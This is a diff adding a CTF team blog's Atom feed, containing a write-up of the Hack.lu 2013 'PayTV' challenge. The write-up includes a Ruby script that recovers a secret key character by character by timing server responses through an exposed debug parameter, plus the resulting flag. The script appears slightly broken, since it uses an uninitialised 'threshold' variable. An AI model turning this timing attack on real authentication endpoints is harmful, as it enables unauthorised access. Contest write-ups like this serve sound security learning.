@@ -1,0 +1,132 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: timing | CaptchaFlag CTF Team]]></title>
+  <link href="http://www.captchaflag.com/blog/categories/timing/atom.xml" rel="self"/>
+  <link href="http://www.captchaflag.com/"/>
+  <updated>2014-10-28T16:35:43-04:00</updated>
+  <id>http://www.captchaflag.com/</id>
+  <author>
+    <name><![CDATA[Captchaflag]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Hack.lu 2013 - PayTV]]></title>
+    <link href="http://www.captchaflag.com/blog/2013/10/27/hack-dot-lu-2013-paytv/"/>
+    <updated>2013-10-27T15:38:00-04:00</updated>
+    <id>http://www.captchaflag.com/blog/2013/10/27/hack-dot-lu-2013-paytv</id>
+    <content type="html"><![CDATA[<h2>Challenge</h2>
+
+<p>These robo-friends were shocked to see that they had to pay to watch the news broadcast about the “Oktoberfest”. Can you help them?</p>
+
+<p>Here is your challenge: https://ctf.fluxfingers.net:1316/</p>
+
+<h2>Analysis</h2>
+
+<p>Notice the following code in key.js in which they have commented out additionally sending '&amp;debug'
+<code>
+document.forms[0].addEventListener('submit', function(e) {
+    var key = document.getElementById('key').value;
+    var xhr = new XMLHttpRequest();
+    xhr.open('post', document.forms[0].action);
+    xhr.addEventListener('load', function() {
+        data = JSON.parse(xhr.responseText);
+        if (data['success']) {
+            document.getElementById('error').style.display = 'none';
+            document.getElementById('noise').style.display = 'none';
+            document.getElementById('news').style.display = 'block';
+            document.getElementById('newstext').innerHTML = data['response'];
+        } else {
+            document.getElementById('error').innerHTML = data['response'];
+        }
+    });
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.send('key=' + encodeURIComponent(key)/* + '&amp;debug'*/)
+    e.preventDefault();
+    return false;
+});
+document.getElementById('key').focus();
+</code></p>
+
+<p>Once we enable the debug parameter, we get some additional output in the response from the server:
+<code>
+{&quot;start&quot;: 1382450009.388883, &quot;end&quot;: 1382450009.388933, &quot;response&quot;: &quot;Wrong key.&quot;, &quot;success&quot;: false}
+</code></p>
+
+<p>The start and end times would indicate how long the comparison ran. I would guess that if we iterate character by character and compare the response times that we should be able to incrementally determine the password.</p>
+
+<p>Running a few guesses manually, I am seeing that a correct character seems to incur a delay of at least 0.1 seconds, while most failures include a very short delay.</p>
+
+<h2>Code</h2>
+
+<p>```ruby</p>
+
+<h1>!/usr/bin/env ruby</h1>
+
+<p>require 'json'
+require 'uri'
+require 'net/http'</p>
+
+<p>uri = URI(&quot;https://ctf.fluxfingers.net:1316/gimmetv&quot;)
+headers =
+{
+    'Cookie' =&gt; &quot;session=9ca658a4d71a9955b5ce2f573782d589ba7589ece79460c198ae4a98b39ea8072b589fce&quot;,
+    'Content-Type' =&gt; &quot;application/x-www-form-urlencoded&quot;
+}</p>
+
+<p>keyspace = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-!@#$%^&amp;*()+=,./&lt;&gt;?`~{}[]|&quot;</p>
+
+<p>i = 0
+base = &quot;&quot;</p>
+
+<p>while i &lt; keyspace.size
+    guess = keyspace[i]
+    postdata = &quot;key=#{URI.escape(base+guess)}&amp;debug&quot;</p>
+
+<pre><code>https = Net::HTTP.new(uri.host, uri.port)
+https.use_ssl = true
+
+response = https.post(uri.path, postdata, headers)
+json = JSON.parse(response.body)
+elapsed = json['end'].to_f - json['start'].to_f
+
+# debugging
+# puts &quot;Guess: #{base+guess}\tElapsed Time: #{elapsed}&quot;
+
+if not json['response'].match(/Wrong key./)
+    print guess
+    puts &quot;&quot;
+    puts json.inspect
+    exit
+end
+
+# appears to be roughly 0.1 second for each correct character
+if elapsed &gt; (0.1 * (base + guess).size)
+    print guess
+    base += guess
+    threshold += elapsed
+    i = -1
+else
+end
+i += 1
+</code></pre>
+
+<p>end
+```</p>
+
+<h2>Solution</h2>
+
+<p><code>bash
+% ruby paytv.rb
+AXMNP93
+{&quot;start&quot;=&gt;1382454502.79326, &quot;end&quot;=&gt;1382454503.49557, &quot;response&quot;=&gt;&quot;OH_THAT_ARTWORK!&quot;, &quot;success&quot;=&gt;true}
+</code></p>
+
+<p><code>OH_THAT_ARTWORK!</code></p>
+]]></content>
+  </entry>
+  
+</feed>
